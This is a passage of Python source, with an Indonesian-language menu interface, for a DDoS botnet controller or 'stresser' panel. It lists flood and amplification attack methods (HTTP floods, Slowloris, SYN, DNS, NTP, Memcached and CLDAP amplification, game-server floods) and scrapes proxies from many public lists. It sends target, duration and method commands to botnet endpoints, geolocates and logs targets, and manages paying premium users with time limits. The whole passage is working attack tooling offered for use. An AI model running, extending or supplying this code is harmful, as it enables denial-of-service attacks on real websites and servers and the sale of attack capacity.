        {"name": "HTTP-NUKE", "desc": "Nuclear L7 Attack All Vectors"},
        {"name": "HTTP-RAPE", "desc": "Extreme L7 Attack Multi-Vector"},
        {"name": "HTTP-BROWSER", "desc": "Simulate Real Browser Traffic"},
        {"name": "HTTP-RAW", "desc": "Raw HTTP Request Flood"},
        {"name": "HTTP-POST", "desc": "POST Request Flood"},
        {"name": "HTTP-GET", "desc": "GET Request Flood"},
        {"name": "HTTP-HEAD", "desc": "HEAD Request Flood"},
        {"name": "HTTP-SLOW", "desc": "Slowloris Connection Hold"},
    ],
    "L4": [
        {"name": "OVH", "desc": "L4 Attacking Server Minecraft/Game"},
        {"name": "TCP-ACK", "desc": "L4 High/s Per Sec Request GBPS"},
        {"name": "TCP-SYN", "desc": "SYN Flood High PPS"},
        {"name": "UDP-FLOOD", "desc": "UDP Packet Flood"},
        {"name": "UDP-AMP", "desc": "UDP Amplification Attack"},
        {"name": "DNS-AMP", "desc": "DNS Amplification Attack"},
        {"name": "NTP-AMP", "desc": "NTP Amplification Attack"},
        {"name": "MEMCACHED", "desc": "Memcached Amplification"},
        {"name": "SSDP-AMP", "desc": "SSDP Amplification Attack"},
        {"name": "CLDAP-AMP", "desc": "CLDAP Amplification Attack"},
        {"name": "GRE-FLOOD", "desc": "GRE Protocol Flood"},
        {"name": "ICMP-FLOOD", "desc": "ICMP Echo Flood"},
        {"name": "RDP-FLOOD", "desc": "RDP Protocol Attack"},
        {"name": "MCBOT", "desc": "Minecraft Bot Join Flood"},
        {"name": "GAME-QUERY", "desc": "Game Server Query Flood"},
        {"name": "TCP-XMAS", "desc": "XMAS Tree Flag Attack"},
        {"name": "TCP-FIN", "desc": "FIN Flag Flood"},
    ]
}


# ========== PROXY SOURCES ==========
PROXY_URLS = [
    "https://raw.githubusercontent.com/RamaXgithub/proxysc3/refs/heads/main/proxy.txt",
    "https://raw.githubusercontent.com/RamaXgithub/proxysc4/refs/heads/main/proxy.txt",
    "https://raw.githubusercontent.com/RamaXgithub/proxysc2/refs/heads/main/proxy.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/xResults/RAW.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/xResults/old-data/Proxies.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks4/socks4.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/socks5.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/socks4.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/https.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/http.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/file/socks5.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/file/socks4.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/file/https.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/file/http.txt",
    "https://raw.githubusercontent.com/mython-dev/free-proxy-4000/main/proxy-4000.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/https.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
    "https://raw.githubusercontent.com/MrMarble/proxy-list/main/all.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/miyukii-chan/proxy-list/master/proxies/http.txt",
    "https://raw.githubusercontent.com/mishakorzik/Free-Proxy/main/proxy.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
    "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
    "https://raw.githubusercontent.com/mallisc5/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/j0rd1s3rr4n0/api/main/proxy/http.txt",
    "https://raw.githubusercontent.com/ItzRazvyy/ProxyList/main/socks5.txt",
    "https://raw.githubusercontent.com/ItzRazvyy/ProxyList/main/socks4.txt",
    "https://raw.githubusercontent.com/ItzRazvyy/ProxyList/main/https.txt",
    "https://raw.githubusercontent.com/ItzRazvyy/ProxyList/main/http.txt",
    "https://raw.githubusercontent.com/im-razvan/proxy_list/main/socks5",
    "https://raw.githubusercontent.com/im-razvan/proxy_list/main/http.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/https.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
    "https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list",
    "https://raw.githubusercontent.com/fahimscirex/proxybd/master/proxylist/socks4.txt",
    "https://raw.githubusercontent.com/fahimscirex/proxybd/master/proxylist/http.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
    "https://raw.githubusercontent.com/enseitankado/proxine/main/proxy/socks5.txt",
    "https://raw.githubusercontent.com/enseitankado/proxine/main/proxy/socks4.txt",
    "https://raw.githubusercontent.com/enseitankado/proxine/main/proxy/https.txt",
    "https://raw.githubusercontent.com/enseitankado/proxine/main/proxy/http.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks5/global/socks5_checked.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks4/global/socks4_checked.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/mix_checked.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/http/global/http_checked.txt",
    "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/https.txt",
    "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/http.txt",
    "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/all.txt",
    "https://raw.githubusercontent.com/Daesrock/XenProxy/main/socks5.txt",
    "https://raw.githubusercontent.com/Daesrock/XenProxy/main/socks4.txt",
    "https://raw.githubusercontent.com/Daesrock/XenProxy/main/proxylist.txt",
    "https://raw.githubusercontent.com/Daesrock/XenProxy/main/https.txt",
    "https://raw.githubusercontent.com/crackmag/proxylist/proxy/proxy.list",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks5",
    "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks4",
    "https://raw.githubusercontent.com/casals-ar/proxy-list/main/https",
    "https://raw.githubusercontent.com/casals-ar/proxy-list/main/http",
    "https://raw.githubusercontent.com/caliphdev/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/caliphdev/Proxy-List/main/socks5.txt",
    "https://raw.githubusercontent.com/caliphdev/Proxy-List/main/http.txt",
    "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/https.txt",
    "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/http.txt",
    "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/all.txt",
    "https://raw.githubusercontent.com/BlackCage/Proxy-Scraper-and-Verifier/main/Proxies/Not_Processed/proxies.txt",
    "https://raw.githubusercontent.com/berkay-digital/Proxy-Scraper/main/proxies.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
    "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
    "https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
]


# ========== DDOS HELPERS ==========
def now():
    return _dt.now().strftime("%Y-%m-%d %H:%M:%S")


def ensure_dirs():
    os.makedirs("ddos", exist_ok=True)
    if not os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, "w") as f:
            json.dump({"ownerId": ["YOUR_ID"], "limit": 300}, f, indent=2)
    if not os.path.exists(PREM_FILE):
        with open(PREM_FILE, "w") as f:
            json.dump({"users": []}, f, indent=2)
    if not os.path.exists(BOTNET_FILE):
        with open(BOTNET_FILE, "w") as f:
            json.dump({"endpoints": []}, f, indent=2)
    if not os.path.exists(METHODS_FILE):
        with open(METHODS_FILE, "w") as f:
            json.dump(DEFAULT_METHODS, f, indent=2)
    if not os.path.exists(PROXY_FILE):
        open(PROXY_FILE, "w").close()


def load_json(path, default):
    try:
        with open(path, "r") as f:
            return json.load(f)
    except:
        return default


def save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"[!] Gagal simpan {path}: {e}")


def load_botnet():
    return load_json(BOTNET_FILE, {"endpoints": []})


def save_botnet(d):
    save_json(BOTNET_FILE, d)


def load_prem():
    return load_json(PREM_FILE, {"users": []})


def save_prem(d):
    save_json(PREM_FILE, d)


def load_settings():
    return load_json(SETTINGS_FILE, {"ownerId": [], "limit": 300})


def load_methods():
    return load_json(METHODS_FILE, DEFAULT_METHODS)


def save_methods(d):
    save_json(METHODS_FILE, d)


def get_all_methods():
    m = load_methods()
    all_m = []
    for layer in ["L7", "L4"]:
        for item in m.get(layer, []):
            all_m.append(item["name"])
    return all_m


def save_output(text, target):
    ts = now()
    header = f"\n--- {ts} | {target} ---\n"
    try:
        with open(OUTFILE, "a") as f:
            f.write(header)
            f.write(text)
    except:
        pass


def save_csv_row(data):
    row = {
        "time": now(),
        "target": data.get("target", ""),
        "duration": data.get("duration", ""),
        "methods": data.get("methods", ""),
        "isp": data.get("isp", ""),
        "ip": data.get("ip", ""),
        "active_servers": data.get("success", 0),
    }
    write_header = not os.path.exists(CSVFILE)
    try:
        with open(CSVFILE, "a", newline="") as csvf:
            writer = csv.DictWriter(csvf, fieldnames=list(row.keys()))
            if write_header:
                writer.writeheader()
            writer.writerow(row)
    except:
        pass


def reverse_dns(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except:
        return None


def query_ip(target):
    try:
        r = requests.get(
            f"http://ip-api.com/json/{target}?fields=query,isp,org,as,country,regionName,city,zip,timezone,lat,lon,status,message",
            timeout=10
        )
        return r.json()
    except Exception as e:
        return {"status": "fail", "message": str(e)}


def format_ip_result(data):
    if not data or data.get("status") != "success":
        return f"Error: {data.get('message', 'unknown')}\n"
    lat, lon = data.get("lat"), data.get("lon")
    maps = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else "N/A"
    lines = [
        "Hasil IP Tracking:",
        f"IP        : {data.get('query', '')}",
        f"Negara    : {data.get('country', '')}",
        f"Region    : {data.get('regionName', '')}",
        f"Kota      : {data.get('city', '')}",
        f"ZIP       : {data.get('zip', '')}",
        f"ISP / Org : {data.get('isp', '')} / {data.get('org', '')}",
        f"ASN       : {data.get('as', '')}",
        f"Timezone  : {data.get('timezone', '')}",
        f"Lokasi    : {lat}, {lon}",
        f"Maps      : {maps}",
    ]
    return "\n".join(lines) + "\n"


def single_lookup(target):
    data = query_ip(target)
    out = format_ip_result(data)
    qip = data.get("query") or target
    rdns = reverse_dns(qip) if data.get("status") == "success" else None
    if rdns:
        out += f"Reverse DNS: {rdns}\n"
    print("\n" + out)
    save_output(out, qip)


def show_methods():
    print(BANNER)
    print(f"{CYAN}[ METHODS LIST ]{RESET}\n")
    m = load_methods()
    l7 = m.get("L7", [])
    l4 = m.get("L4", [])

    print(f"{MAGENTA_BG}{WHITE}{BOLD}  LAYER 7 (HTTP FLOOD) - {len(l7)} methods  {RESET}\n")
    for i, item in enumerate(l7, 1):
        print(f"  {GREEN}{i:>2}.{RESET} {BOLD}{item['name']:<16}{RESET} {DIM}{item['desc']}{RESET}")
    print()
    print(f"{BLUE_BG}{WHITE}{BOLD}  LAYER 4 (NETWORK) - {len(l4)} methods  {RESET}\n")
    for i, item in enumerate(l4, 1):
        print(f"  {GREEN}{i:>2}.{RESET} {BOLD}{item['name']:<16}{RESET} {DIM}{item['desc']}{RESET}")
    print()
    print(f"{YELLOW}Total: {len(l7) + len(l4)} methods{RESET}\n")


def add_method():
    print(BANNER)
    print(f"{CYAN}[ ADD METHOD ]{RESET}\n")
    print("1) Tambah ke L7")
    print("2) Tambah ke L4")
    print("3) Kembali")
    choice = input("\nPilih > ").strip()
    if choice not in ("1", "2"):
        return
    layer = "L7" if choice == "1" else "L4"
    name = input("Nama method (contoh: HTTP-NEW) > ").strip().upper()
    if not name:
        print(f"{RED}[!] Nama kosong.{RESET}")
        return
    desc = input("Deskripsi (opsional) > ").strip() or "Custom method"
    m = load_methods()
    if name in [x["name"] for x in m.get(layer, [])]:
        print(f"{YELLOW}[!] Method {name} udah ada di {layer}.{RESET}")
        return
    m.setdefault(layer, []).append({"name": name, "desc": desc})
    save_methods(m)
    print(f"{GREEN}[✓] {name} ditambah ke {layer}{RESET}")


def del_method():
    print(BANNER)
    print(f"{CYAN}[ DELETE METHOD ]{RESET}\n")
    m = load_methods()
    all_m = []
    print(f"{MAGENTA}L7:{RESET}")
    for i, item in enumerate(m.get("L7", []), 1):
        print(f"  {i}. {item['name']}")
        all_m.append(("L7", item["name"]))
    print(f"{MAGENTA}L4:{RESET}")
    offset = len(m.get("L7", []))
    for i, item in enumerate(m.get("L4", []), 1):
        print(f"  {offset + i}. {item['name']}")
        all_m.append(("L4", item["name"]))
    try:
        idx = int(input("\nNomor method yang mau dihapus > ").strip()) - 1
        if idx < 0 or idx >= len(all_m):
            print(f"{RED}[!] Invalid!{RESET}")
            return
        layer, name = all_m[idx]
        m[layer] = [x for x in m[layer] if x["name"] != name]
        save_methods(m)
        print(f"{GREEN}[✓] {name} dihapus dari {layer}{RESET}")
    except:
        print(f"{RED}[!] Input invalid.{RESET}")


def search_method():
    print(BANNER)
    print(f"{CYAN}[ SEARCH METHOD ]{RESET}\n")
    q = input("Kata kunci > ").strip().upper()
    if not q:
        return
    m = load_methods()
    found = 0
    for layer in ["L7", "L4"]:
        for item in m.get(layer, []):
            if q in item["name"].upper() or q in item["desc"].upper():
                print(f"  [{layer}] {GREEN}{item['name']}{RESET} - {DIM}{item['desc']}{RESET}")
                found += 1
    print(f"\n{YELLOW}Ditemukan: {found}{RESET}")


def reset_methods():
    print(BANNER)
    print(f"{CYAN}[ RESET METHODS ]{RESET}\n")
    confirm = input("Reset ke default? (y/n) > ").strip().lower()
    if confirm == "y":
        save_methods(DEFAULT_METHODS)
        print(f"{GREEN}[✓] Methods direset ke default!{RESET}")
    else:
        print(f"{YELLOW}[!] Dibatalkan.{RESET}")


# ========== BOTNET ATTACK ==========
async def send_attack_async(endpoints, target, duration, methods):
    success = 0
    if HAS_AIOHTTP:
        async with aiohttp.ClientSession() as session:
            for ep in endpoints:
                url = f"{ep}?target={target}&time={duration}&methods={methods}"
                try:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                        if r.status == 200:
                            success += 1
                            print(f"  {GREEN}[✓]{RESET} {ep}")
                        else:
                            print(f"  {YELLOW}[!]{RESET} {ep} -> {r.status}")
                except Exception as e:
                    print(f"  {RED}[✗]{RESET} {ep} -> {str(e)[:60]}")
    else:
        for ep in endpoints:
            url = f"{ep}?target={target}&time={duration}&methods={methods}"
            try:
                r = requests.get(url, timeout=10)
                if r.status_code == 200:
                    success += 1
                    print(f"  {GREEN}[✓]{RESET} {ep}")
                else:
                    print(f"  {YELLOW}[!]{RESET} {ep} -> {r.status_code}")
            except Exception as e:
                print(f"  {RED}[✗]{RESET} {ep} -> {str(e)[:60]}")
    return success


def pick_method():
    m = load_methods()
    l7 = m.get("L7", [])
    l4 = m.get("L4", [])
    all_m = []
    print(f"\n{MAGENTA_BG}{WHITE}{BOLD} L7 METHODS {RESET}")
    for i, item in enumerate(l7, 1):
        print(f"  {GREEN}{i:>2}.{RESET} {item['name']:<16} {DIM}{item['desc'][:40]}{RESET}")
        all_m.append(item["name"])
    print(f"\n{BLUE_BG}{WHITE}{BOLD} L4 METHODS {RESET}")
    offset = len(l7)
    for i, item in enumerate(l4, 1):
        print(f"  {GREEN}{offset+i:>2}.{RESET} {item['name']:<16} {DIM}{item['desc'][:40]}{RESET}")
        all_m.append(item["name"])
    print(f"\n{YELLOW}0) Ketik manual{RESET}")
    choice = input("\nPilih nomor methods (atau 0 untuk manual) > ").strip()
    if choice == "0":
        return input("Methods manual > ").strip()
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(all_m):
            return all_m[idx]
    except:
        pass
    return "HTTP-FLOOD"


def attack_menu():
    print(BANNER)
    print(f"{CYAN}[ ATTACK MENU ]{RESET}\n")
    target = input("Masukkan target (URL/IP) > ").strip()
    if not target:
        print(f"{RED}[!] Target kosong.{RESET}")
        return
    try:
        duration = int(input("Durasi (detik, max 300) > ").strip() or "60")
    except:
        duration = 60
    methods = pick_method()
    if not methods:
        print(f"{RED}[!] Methods kosong.{RESET}")
        return

    botnet = load_botnet()
    endpoints = botnet.get("endpoints", [])
    if not endpoints:
        print(f"{RED}[!] Botnet kosong! Tambah endpoint dulu di menu botnet.{RESET}")
        return

    hostname = urlparse(target).hostname or target
    print(f"\n{YELLOW}[*] Resolving target...{RESET}")
    info = query_ip(hostname)
    isp = info.get("isp", "Unknown")
    ip = info.get("query", "Unknown")
    print(f"    ISP: {isp}")
    print(f"    IP : {ip}\n")

    print(f"{YELLOW}[*] Sending attack ke {len(endpoints)} endpoint(s)...{RESET}")
    print(f"    Target  : {target}")
    print(f"    Duration: {duration}s")
    print(f"    Methods : {methods}\n")

    start = time.time()
    try:
        success = asyncio.run(send_attack_async(endpoints, target, duration, methods))
    except:
        success = asyncio.get_event_loop().run_until_complete(
            send_attack_async(endpoints, target, duration, methods)
        )
    elapsed = round(time.time() - start, 2)

    result = (
        f"\n{'='*50}\n"
        f"🚀 ATTACK SENT!\n"
        f"{'='*50}\n"
        f"🎯 Target      : {target}\n"
        f"⏳ Duration    : {duration}s\n"
        f"⚔️ Methods     : {methods}\n"
        f"🌐 ISP         : {isp}\n"
        f"📡 IP          : {ip}\n"
        f"💮 Active Srv  : {success}/{len(endpoints)}\n"
        f"⚡ Exec Time   : {elapsed}s\n"
        f"🔍 Check       : https://check-host.net/check-http?host={target}\n"
        f"{'='*50}\n"
    )
    print(result)
    save_output(result, target)
    save_csv_row({
        "target": target, "duration": duration, "methods": methods,
        "isp": isp, "ip": ip, "success": success
    })


# ========== PROXY SCRAPER (DDOS FULL) ==========
def scrape_proxies():
    print(BANNER)
    print(f"{CYAN}[ PROXY SCRAPER ]{RESET}\n")
    print(f"{YELLOW}[*] Scraping dari {len(PROXY_URLS)} sumber...{RESET}\n")
    proxies = set()
    success_urls = 0
    failed_urls = 0
    total = len(PROXY_URLS)

    for i, url in enumerate(PROXY_URLS, 1):
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                found = 0
                for line in r.text.splitlines():
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if ":" in line and not line.startswith("http"):
                        parts = line.split(":")
                        if len(parts) >= 2:
                            proxies.add(f"{parts[0]}:{parts[1]}")
                            found += 1
                success_urls += 1
                print(f"  [{i}/{total}] {GREEN}✓{RESET} {found:>4} proxy | {url[:55]}...")
            else:
                failed_urls += 1
                print(f"  [{i}/{total}] {YELLOW}!{RESET} HTTP {r.status_code} | {url[:55]}...")
        except Exception as e:
            failed_urls += 1
            print(f"  [{i}/{total}] {RED}✗{RESET} {str(e)[:35]} | {url[:55]}...")

    with open(PROXY_FILE, "w") as f:
        f.write("\n".join(sorted(proxies)))

    print(f"\n{GREEN}[✓] Scraping selesai!{RESET}")
    print(f"  Total URL   : {total}")
    print(f"  Success     : {success_urls}")
    print(f"  Failed      : {failed_urls}")
    print(f"  Total proxy : {len(proxies)}")
    print(f"  Disimpan ke : {PROXY_FILE}\n")


def proxy_checker():
    print(BANNER)
    print(f"{CYAN}[ PROXY CHECKER ]{RESET}\n")
    if not os.path.exists(PROXY_FILE):
        print(f"{RED}[!] File {PROXY_FILE} belum ada. Scrape dulu.{RESET}")
        return
    with open(PROXY_FILE, "r") as f:
        proxies = [l.strip() for l in f if l.strip()]
    if not proxies:
        print(f"{RED}[!] Proxy kosong.{RESET}")
        return

    print(f"{YELLOW}[*] Loaded {len(proxies)} proxy dari file.{RESET}")
    try:
        limit = int(input(f"Berapa banyak yang mau dicek? (default 50, max {len(proxies)}) > ").strip() or "50")
    except:
        limit = 50
    limit = min(limit, len(proxies))

    print(f"\n{YELLOW}[*] Checking {limit} proxy...{RESET}\n")
    alive = []
    for i, px in enumerate(proxies[:limit], 1):
        try:
            proxy_dict = {"http": f"http://{px}", "https": f"http://{px}"}
            r = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=8)
            if r.status_code == 200:
                alive.append(px)
                print(f"  [{i}/{limit}] {GREEN}✓ ALIVE{RESET} {px}")
            else:
                print(f"  [{i}/{limit}] {YELLOW}! {r.status_code}{RESET} {px}")
        except Exception:
            print(f"  [{i}/{limit}] {RED}✗ DEAD{RESET}  {px}")

    alive_file = "proxy_alive.txt"
    with open(alive_file, "w") as f:
        f.write("\n".join(alive))
    print(f"\n{GREEN}[✓] Selesai! Alive: {len(alive)}/{limit}{RESET}")
    print(f"  Disimpan ke: {alive_file}\n")


def view_proxy():
    print(BANNER)
    print(f"{CYAN}[ VIEW PROXY ]{RESET}\n")
    if not os.path.exists(PROXY_FILE):
        print(f"{YELLOW}[!] File {PROXY_FILE} belum ada.{RESET}")
        return
    with open(PROXY_FILE, "r") as f:
        lines = f.readlines()
    print(f"Total: {len(lines)} proxy\n")
    for i, l in enumerate(lines[:50], 1):
        print(f"  {i}. {l.strip()}")
    if len(lines) > 50:
        print(f"  ... dan {len(lines) - 50} lagi")


# ========== BOTNET MANAGEMENT ==========
def add_botnet():
    print(BANNER)
    print(f"{CYAN}[ ADD BOTNET ]{RESET}\n")
    url_in = input("Masukkan endpoint (URL/IP:port) > ").strip()
    if not url_in:
        print(f"{RED}[!] Kosong.{RESET}")
        return
    try:
        parsed = urlparse(url_in)
        host = parsed.netloc or parsed.path
        ep = f"http://{host}/BruteStresser"
        data = load_botnet()
        if ep in data["endpoints"]:
            print(f"{YELLOW}[!] Endpoint udah ada: {ep}{RESET}")
            return
        data["endpoints"].append(ep)
        save_botnet(data)
        print(f"{GREEN}[✓] Ditambah: {ep}{RESET}")
    except Exception as e:
        print(f"{RED}[!] URL invalid: {e}{RESET}")


def add_botnet_manual():
    print(BANNER)
    print(f"{CYAN}[ ADD BOTNET (MANUAL) ]{RESET}\n")
    print("Format: http://ip:port/path")
    ep = input("Endpoint > ").strip()
    if not ep:
        print(f"{RED}[!] Kosong.{RESET}")
        return
    data = load_botnet()
    if ep in data["endpoints"]:
        print(f"{YELLOW}[!] Endpoint udah ada: {ep}{RESET}")
        return
    data["endpoints"].append(ep)
    save_botnet(data)
    print(f"{GREEN}[✓] Ditambah: {ep}{RESET}")


def del_botnet():
    print(BANNER)
    print(f"{CYAN}[ DELETE BOTNET ]{RESET}\n")
    data = load_botnet()
    eps = data.get("endpoints", [])
    if not eps:
        print(f"{YELLOW}[!] Botnet kosong.{RESET}")
        return
    for i, ep in enumerate(eps, 1):
        print(f"  {i}. {ep}")
    try:
        idx = int(input("\nIndex yang mau dihapus > ").strip()) - 1
        if idx < 0 or idx >= len(eps):
            print(f"{RED}[!] Index invalid!{RESET}")
            return
        removed = eps.pop(idx)
        save_botnet(data)
        print(f"{GREEN}[✓] Dihapus: {removed}{RESET}")
    except:
        print(f"{RED}[!] Input invalid.{RESET}")


def list_botnet():
    print(BANNER)
    print(f"{CYAN}[ LIST BOTNET ]{RESET}\n")
    data = load_botnet()
    eps = data.get("endpoints", [])
    if not eps:
        print(f"{YELLOW}[!] Botnet kosong.{RESET}")
        return
    print(f"Total: {len(eps)} endpoint(s)\n")
    for i, ep in enumerate(eps, 1):
        print(f"  {GREEN}{i}.{RESET} {ep}")
    print()


def test_botnet():
    print(BANNER)
    print(f"{CYAN}[ TEST BOTNET ]{RESET}\n")
    data = load_botnet()
    eps = data.get("endpoints", [])
    if not eps:
        print(f"{YELLOW}[!] Botnet kosong.{RESET}")
        return
    print(f"{YELLOW}[*] Testing {len(eps)} endpoint(s)...{RESET}\n")
    valid = []
    success = 0
    for ep in eps:
        url = f"{ep}?target=https://google.com&time=1&methods=ninja"
        try:
            r = requests.get(url, timeout=20)
            if r.status_code == 200:
                success += 1
                valid.append(ep)
                print(f"  {GREEN}[✓ ONLINE]{RESET}  {ep}")
            else:
                print(f"  {YELLOW}[! {r.status_code}]{RESET} {ep}")
        except Exception as e:
            print(f"  {RED}[✗ DEAD]{RESET}   {ep}")
    data["endpoints"] = valid
    save_botnet(data)
    print(f"\n{GREEN}[✓] Selesai! Online: {success}/{len(eps)}{RESET}\n")


# ========== PREMIUM MANAGEMENT ==========
def add_prem():
    print(BANNER)
    print(f"{CYAN}[ ADD PREMIUM ]{RESET}\n")
    uid = input("User ID > ").strip()
    if not uid:
        print(f"{RED}[!] Kosong.{RESET}")
        return
    try:
        maxtime = int(input("Max time (detik) > ").strip() or "300")
        days = int(input("Berlaku (hari) > ").strip() or "30")
    except:
        print(f"{RED}[!] Input invalid.{RESET}")
        return
    data = load_prem()
    expiry = (_dt.now() + timedelta(days=days)).isoformat()
    existing = next((u for u in data["users"] if u["id"] == uid), None)
    if existing:
        existing["maxtime"] = maxtime
        existing["expiry"] = expiry
    else:
        data["users"].append({"id": uid, "maxtime": maxtime, "expiry": expiry})
    save_prem(data)
    print(f"{GREEN}[✓] User {uid} jadi premium!{RESET}")
    print(f"    Maxtime: {maxtime}s | Expired: {days} hari")


def cek_prem():
    print(BANNER)
    print(f"{CYAN}[ CEK PREMIUM ]{RESET}\n")
    uid = input("User ID > ").strip()
    data = load_prem()
    user = next((u for u in data["users"] if u["id"] == uid), None)
    if not user:
        print(f"{RED}[!] Bukan premium.{RESET}")
        return
    expiry = _dt.fromisoformat(user["expiry"])
    status = f"{GREEN}AKTIF{RESET}" if _dt.now() <= expiry else f"{RED}EXPIRED{RESET}"
    print(f"  ID      : {uid}")
    print(f"  Status  : {status}")
    print(f"  Maxtime : {user['maxtime']}s")
    print(f"  Expiry  : {expiry.strftime('%Y-%m-%d %H:%M')}\n")


def list_prem():
    print(BANNER)
    print(f"{CYAN}[ LIST PREMIUM ]{RESET}\n")
    data = load_prem()
    users = data.get("users", [])
    if not users:
        print(f"{YELLOW}[!] Belum ada user premium.{RESET}")
        return
    for i, u in enumerate(users, 1):
        expiry = _dt.fromisoformat(u["expiry"])
        status = f"{GREEN}✓{RESET}" if _dt.now() <= expiry else f"{RED}✗{RESET}"
        print(f"  {i}. [{status}] ID: {u['id']} | Max: {u['maxtime']}s | Exp: {expiry.strftime('%Y-%m-%d')}")
    print()


def del_prem():
    print(BANNER)
    print(f"{CYAN}[ DELETE PREMIUM ]{RESET}\n")
    data = load_prem()
    users = data.get("users", [])
    if not users:
        print(f"{YELLOW}[!] Belum ada user premium.{RESET}")
